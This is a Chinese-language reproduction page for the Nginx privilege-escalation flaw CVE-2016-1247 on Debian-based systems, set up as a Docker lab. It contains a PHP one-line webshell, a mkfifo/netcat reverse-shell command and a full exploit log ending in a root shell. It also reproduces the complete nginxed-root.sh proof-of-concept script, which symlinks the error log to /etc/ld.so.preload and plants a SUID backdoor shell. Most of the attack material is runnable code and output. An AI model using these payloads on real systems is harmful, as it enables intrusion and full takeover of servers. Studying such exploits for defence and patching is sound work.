<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2016-1247）Nginx 提权漏洞</h1><h2>一、漏洞简介</h2><p>漏洞原因是在打包nginx时，设置的日志目录的所有者为 www-data ，导致一个低权限账户可以利用软链接的帮助达到提权。所以修复也是将日志的所有者改为root即可。</p><h2>二、漏洞影响</h2><p>Debian: Fixed in Nginx 1.6.2-5+deb8u3</p><p>Ubuntu:</p><p>Fixed in the following updated Nginx package versions on Ubuntu:</p><p>Ubuntu 16.04 LTS: 1.10.0-0ubuntu0.16.04.3</p><p>Ubuntu 14.04 LTS: 1.4.6-1ubuntu3.6</p><p>Ubuntu 16.10: 1.10.1-0ubuntu1.1</p><h2>三、复现过程</h2><p>docker run -d -i --name CVE-2016-1247 -p 80:80 xk0n/cve-2016-1247</p><p>在容器里配置了 nginx + php 的环境，并有一个一句话木马 /var/www/backdoor.php</p><p>&lt;?php<br />@eval($_POST[c]);<br />?&gt;</p><p>可以用<a href="https://github.com/antoor/antSword">antSword</a>连接测试，用下面的语句可以反弹回一个shell</p><p>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc &lt;target IP&gt; &lt;port&gt; &gt;/tmp/bd</p><p>测试时发现gcc编译出错，可以在本地编译一个后上传。poc运行后会等待 logrotate 此时可以用下面的命令，人工触发条件。</p><p>/usr/sbin/logrotate -vf /etc/logrotate.d/nginx</p><p>测试记录如下：</p><p>$ bash ./cve-2016-1247-poc.sh /var/log/nginx/error.log<br /> _______________________________<br />&lt; Is your server (N)jinxed ? ;o &gt;<br /> -------------------------------<br />           \ <br />            \          __---__<br />                    _-       /--______<br />               __--( /     \ )XXXXXXXXXXX\v.  <br />             .-XXX(   O   O  )XXXXXXXXXXXXXXX- <br />            /XXX(       U     )        XXXXXXX\ <br />          /XXXXX(              )--_  XXXXXXXXXXX\ <br />         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ <br />         XXXXX/   /            XXXXXX   \__ \XXXXX<br />         XXXXXX__/          XXXXXX         \__----&gt;<br /> ---___  XXX__/          XXXXXX      \__         /<br />   \-  --__/   ___/\  XXXXXX            /  ___--/=<br />    \-\    ___/    XXXXXX              '--- XXXXXX<br />       \-\/XXX\ XXXXXX                      /XXXXX<br />         \XXXXXXXXX   \                    /XXXXX/<br />          \XXXXXX      &gt;                 _/XXXXX/<br />            \XXXXX--__/              __-- XXXX/<br />             -XXXXXXXX---------------  XXXXXX-<br />                \XXXXXXXXXXXXXXXXXXXXXXXXXX/<br />                  ""VXXXXXXXXXXXXXXXXXXV""<br /> <br />Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) <br />nginxed-root.sh (ver. 1.0)<br /><br />Discovered and coded by: <br /><br />Dawid Golunski <br />https://legalhackers.com <br /><br />[+] Starting the exploit as: <br />uid=33(www-data) gid=33(www-data) groups=33(www-data)<br /><br />[+] Backdoor/low-priv shell installed at: <br />-rwxr-xr-x 1 www-data www-data 1021112 Nov 19 13:44 /tmp/nginxrootsh<br /><br />[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: <br />lrwxrwxrwx 1 www-data www-data 18 Nov 19 13:44 /var/log/nginx/error.log -&gt; /etc/ld.so.preload<br /><br />[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...<br />[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: <br />-rw-r--r-- 1 www-data root 19 Nov 19 13:45 /etc/ld.so.preload<br /><br />[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload<br /><br />[+] The /etc/ld.so.preload file now contains: <br />/tmp/privesclib.so<br /><br />[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!<br />-rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh<br /><br />[+] Rootshell got assigned root SUID perms at: <br />-rwsrwxrwx 1 root root 1021112 Nov 19 13:44 /tmp/nginxrootsh<br /><br />The server is (N)jinxed ! ;) Got root via Nginx!<br /><br />[+] Spawning the rootshell /tmp/nginxrootsh now! <br /><br />nginxrootsh: cannot set terminal process group (1156): Inappropriate ioctl for device<br />nginxrootsh: no job control in this shell<br />nginxrootsh-4.3# id<br />id<br />uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)<br />nginxrootsh-4.3# whoami<br />whoami<br />root<br />nginxrootsh-4.3# whoami<br />whoami<br />root</p><h3>poc</h3><p>#!/bin/bash<br />#<br /># Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit<br /># nginxed-root.sh (ver. 1.0)<br />#<br /># CVE-2016-1247<br />#<br /># Discovered and coded by:<br />#<br /># Dawid Golunski<br /># dawid[at]legalhackers.com<br />#<br /># https://legalhackers.com<br />#<br /># Follow https://twitter.com/dawid_golunski for updates on this advisory.<br />#<br /># ---<br /># This PoC exploit allows local attackers on Debian-based systems (Debian, Ubuntu<br /># etc.) to escalate their privileges from nginx web server user (www-data) to root <br /># through unsafe error log handling.<br />#<br /># The exploit waits for Nginx server to be restarted or receive a USR1 signal.<br /># On Debian-based systems the USR1 signal is sent by logrotate (/etc/logrotate.d/nginx)<br /># script which is called daily by the cron.daily on default installations.<br /># The restart should take place at 6:25am which is when cron.daily executes.<br /># Attackers can therefore get a root shell automatically in 24h at most without any admin<br /># interaction just by letting the exploit run till 6:25am assuming that daily logrotation <br /># has been configured. <br />#<br />#<br /># Exploit usage:<br /># ./nginxed-root.sh path_to_nginx_error.log <br />#<br /># To trigger logrotation for testing the exploit, you can run the following command:<br />#<br /># /usr/sbin/logrotate -vf /etc/logrotate.d/nginx<br />#<br /># See the full advisory for details at:<br /># https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html<br />#<br /># Video PoC:<br /># https://legalhackers.com/videos/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html<br />#<br />#<br /># Disclaimer:<br /># For testing purposes only. Do no harm.<br />#<br /><br />BACKDOORSH="/bin/bash"<br />BACKDOORPATH="/tmp/nginxrootsh"<br />PRIVESCLIB="/tmp/privesclib.so"<br />PRIVESCSRC="/tmp/privesclib.c"<br />SUIDBIN="/usr/bin/sudo"<br /><br />function cleanexit {<br />    # Cleanup <br />    echo -e "\n[+] Cleaning up..."<br />    rm -f $PRIVESCSRC<br />    rm -f $PRIVESCLIB<br />    rm -f $ERRORLOG<br />    touch $ERRORLOG<br />    if [ -f /etc/ld.so.preload ]; then<br />        echo -n &gt; /etc/ld.so.preload<br />    fi<br />    echo -e "\n[+] Job done. Exiting with code $1 \n"<br />    exit $1<br />}<br /><br />function ctrl_c() {<br />        echo -e "\n[+] Ctrl+C pressed"<br />    cleanexit 0<br />}<br /><br />#intro <br /><br />cat &lt;&lt;_eascii_<br /> _______________________________<br />&lt; Is your server (N)jinxed ? ;o &gt;<br /> -------------------------------<br />           \ <br />            \          __---__<br />                    _-       /--______<br />               __--( /     \ )XXXXXXXXXXX\v.  <br />             .-XXX(   O   O  )XXXXXXXXXXXXXXX- <br />            /XXX(       U     )        XXXXXXX\ <br />          /XXXXX(              )--_  XXXXXXXXXXX\ <br />         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ <br />         XXXXX/   /            XXXXXX   \__ \XXXXX<br />         XXXXXX__/          XXXXXX         \__----&gt;<br /> ---___  XXX__/          XXXXXX      \__         /<br />   \-  --__/   ___/\  XXXXXX            /  ___--/=<br />    \-\    ___/    XXXXXX              '--- XXXXXX<br />       \-\/XXX\ XXXXXX                      /XXXXX<br />         \XXXXXXXXX   \                    /XXXXX/<br />          \XXXXXX      &gt;                 _/XXXXX/<br />            \XXXXX--__/              __-- XXXX/<br />             -XXXXXXXX---------------  XXXXXX-<br />                \XXXXXXXXXXXXXXXXXXXXXXXXXX/<br />                  ""VXXXXXXXXXXXXXXXXXXV""<br />_eascii_<br /><br />echo -e "\033[94m \nNginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) \nnginxed-root.sh (ver. 1.0)\n"<br />echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m"<br /><br /># Args<br />if [ $# -lt 1 ]; then<br />    echo -e "\n[!] Exploit usage: \n\n$0 path_to_error.log \n"<br />    echo -e &quot;It seems that this server uses: `ps aux | grep nginx | awk -F'log-error=' '{ print $2 }' | cut -d' ' -f1 | grep '/'`\n&quot;<br />    exit 3<br />fi<br /><br /># Priv check<br /><br />echo -e "\n[+] Starting the exploit as: \n\033[94m`id`\033[0m"<br />id | grep -q www-data<br />if [ $? -ne 0 ]; then<br />    echo -e "\n[!] You need to execute the exploit as www-data user! Exiting.\n"<br />    exit 3<br />fi<br /><br /># Set target paths<br />ERRORLOG="$1"<br />if [ ! -f $ERRORLOG ]; then<br />    echo -e &quot;\n[!] The specified Nginx error log ($ERRORLOG) doesn't exist. Try again.\n&quot;<br />    exit 3<br />fi<br /><br /># [ Exploitation ]<br /><br />trap ctrl_c INT<br /># Compile privesc preload library<br /># echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"<br /># cat &lt;&lt;_solibeof_&gt;$PRIVESCSRC<br /># #define _GNU_SOURCE<br /># #include &lt;stdio.h&gt;<br /># #include &lt;sys/stat.h&gt;<br /># #include &lt;unistd.h&gt;<br /># #include &lt;dlfcn.h&gt;<br />#        #include &lt;sys/types.h&gt;<br />#        #include &lt;sys/stat.h&gt;<br />#        #include &lt;fcntl.h&gt;<br /><br /># uid_t geteuid(void) {<br />#     static uid_t  (*old_geteuid)();<br />#     old_geteuid = dlsym(RTLD_NEXT, "geteuid");<br />#     if ( old_geteuid() == 0 ) {<br />#         chown("$BACKDOORPATH", 0, 0);<br />#         chmod("$BACKDOORPATH", 04777);<br />#         unlink("/etc/ld.so.preload");<br />#     }<br />#     return old_geteuid();<br /># }<br /># _solibeof_<br /># /bin/bash -c "gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl"<br /># if [ $? -ne 0 ]; then<br />#     echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."<br />#     cleanexit 2;<br /># fi<br /><br /><br /># Prepare backdoor shell<br />cp $BACKDOORSH $BACKDOORPATH<br />echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"<br /><br /># Safety check<br />if [ -f /etc/ld.so.preload ]; then<br />    echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."<br />    exit 2<br />fi<br /><br /># Symlink the log file<br />rm -f $ERRORLOG &amp;&amp; ln -s /etc/ld.so.preload $ERRORLOG<br />if [ $? -ne 0 ]; then<br />    echo -e &quot;\n[!] Couldn't remove the $ERRORLOG file or create a symlink.&quot;<br />    cleanexit 3<br />fi<br />echo -e "\n[+] The server appears to be \033[94m(N)jinxed\033[0m (writable logdir) ! :) Symlink created at: \n`ls -l $ERRORLOG`"<br /><br /># Make sure the nginx access.log contains at least 1 line for the logrotation to get triggered<br />curl http://localhost/ &gt;/dev/null 2&gt;/dev/null<br /># Wait for Nginx to re-open the logs/USR1 signal after the logrotation (if daily <br /># rotation is enable in logrotate config for nginx, this should happen within 24h at 6:25am)<br />echo -ne "\n[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am..."<br />while :; do <br />    sleep 1<br />    if [ -f /etc/ld.so.preload ]; then<br />        echo $PRIVESCLIB &gt; /etc/ld.so.preload<br />        rm -f $ERRORLOG<br />        break;<br />    fi<br />done<br /><br /># /etc/ld.so.preload should be owned by www-data user at this point<br /># Inject the privesc.so shared library to escalate privileges<br />echo $PRIVESCLIB &gt; /etc/ld.so.preload<br />echo -e "\n[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: \n`ls -l /etc/ld.so.preload`"<br />echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"<br />echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"<br />chmod 755 /etc/ld.so.preload<br /><br /># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)<br />echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"<br />sudo 2&gt;/dev/null &gt;/dev/null<br /><br /># Check for the rootshell<br />ls -l $BACKDOORPATH<br />ls -l $BACKDOORPATH | grep rws | grep -q root<br />if [ $? -eq 0 ]; then <br />    echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"<br />    echo -e "\n\033[94mThe server is (N)jinxed ! ;) Got root via Nginx!\033[0m"<br />else<br />    echo -e "\n[!] Failed to get root"<br />    cleanexit 2<br />fi<br /><br />rm -f $ERRORLOG<br />echo &gt; $ERRORLOG<br /> <br /># Use the rootshell to perform cleanup that requires root privilges<br />$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"<br /># Reset the logging to error.log<br />$BACKDOORPATH -p -c "kill -USR1 `pidof -s nginx`"<br /><br /># Execute the rootshell<br />echo -e "\n[+] Spawning the rootshell $BACKDOORPATH now! \n"<br />$BACKDOORPATH -p -i<br /><br /># Job done.<br />cleanexit 0</p></body></html>